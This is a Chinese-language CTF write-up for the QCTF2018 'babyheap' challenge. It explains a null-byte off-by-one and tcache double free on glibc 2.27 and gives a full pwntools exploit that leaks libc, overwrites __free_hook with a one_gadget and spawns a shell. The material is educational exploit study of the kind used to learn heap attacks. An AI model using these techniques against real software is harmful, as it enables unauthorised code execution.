# QCTF2018 babyheap
## Author: 文火
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这题是有tcache机制的libc-2.27的题，为此特意装了一个Ubuntu18（啊还是屈服了，特效真好看真香）。不扯淡了，先放一个tcache的[学习资料](https://www.secpulse.com/archives/71958.html)，嗯这就够了。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>程序逻辑很简单，一眼就看出null byte off by one。因为有tcache的机制(**注意在tcache的堆小于7个，而且不大于0x408**)所以做法特殊一些，这里用shrink chunk的方法来做，这里有个差不多做法的，有[图解](https://bbs.pediy.com/thread-225973.htm)（其实tcache里把小于0x408的堆都看成是不安全的fastbin这样理解会不会更简单些，溜了溜了）。</font></br>

leak
=====

```python
#----------------------------
# leak, leak, step the first
# null byte off by one to chunk-shrink overlapping

add(0x18,'\n')                          #0
add(0x500,'a'*0x4f0+p64(0x500)+'\n')    #1
add(0x420,'\n');                        #2
add(0x18,'\n');                         #3

delete(1)
delete(0)
add(0x18,'a'*0x18)                      #0
add(0x480,'\n')                         #1
add(0x60,'\n')                          #4
delete(1)
delete(2)

add(0x480,'\n')                         #1
show()
rv('4 : ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3ebca0
log.info(hex(libc_base))
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>根据tcache的缓存机制，直接double free都不带检查的，所以后续就很常规了：</font></br>

```python
#----------------------------
# easy double free and pwned!

add(0x60,'\n')                          #2
delete(2)
delete(4)
add(0x60,p64(free_hook+libc_base)+'\n')
add(0x60,p64(free_hook+libc_base)+'\n')
add(0x60,p64(one_gadget+libc_base)+'\n')

delete(0)
p.interactive()

```

Exploit
======

```python
from pwn import *

DEBUG=1

p=process('./babyheap',env={'LD_PRELOAD':'./libc-2.27.so'})
elf=ELF('./libc-2.27.so') 

free_hook=elf.symbols['__free_hook']
one_gadget=0x4F322

if DEBUG == 1:
    context.log_level='debug'
    gdb.attach(p)

def rv(c):
    p.recvuntil(c)

def sd(c):
    p.send(c)

def sl(c):
    p.sendline(c)

def add(size,content):
    rv('choice :\n')
    sl('1')
    rv('Size: \n')
    sl(str(size))
    rv('Data: \n')
    sd(content)

def delete(index):
    rv('choice :\n')
    sl('2')
    rv('Index: \n')
    sl(str(index))

def show():
    rv('choice :\n')
    sl('3')

#----------------------------
# leak, leak, step the first
# null byte off by one to chunk-shrink overlapping

add(0x18,'\n')                          #0
add(0x500,'a'*0x4f0+p64(0x500)+'\n')    #1
add(0x420,'\n');                        #2
add(0x18,'\n');                         #3

delete(1)
delete(0)
add(0x18,'a'*0x18)                      #0
add(0x480,'\n')                         #1
add(0x60,'\n')                          #4
delete(1)
delete(2)

add(0x480,'\n')                         #1
show()
rv('4 : ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3ebca0
log.info(hex(libc_base))

#----------------------------
# easy double free and pwned!

add(0x60,'\n')                          #2
delete(2)
delete(4)
add(0x60,p64(free_hook+libc_base)+'\n')
add(0x60,p64(free_hook+libc_base)+'\n')
add(0x60,p64(one_gadget+libc_base)+'\n')

delete(0)
p.interactive()

```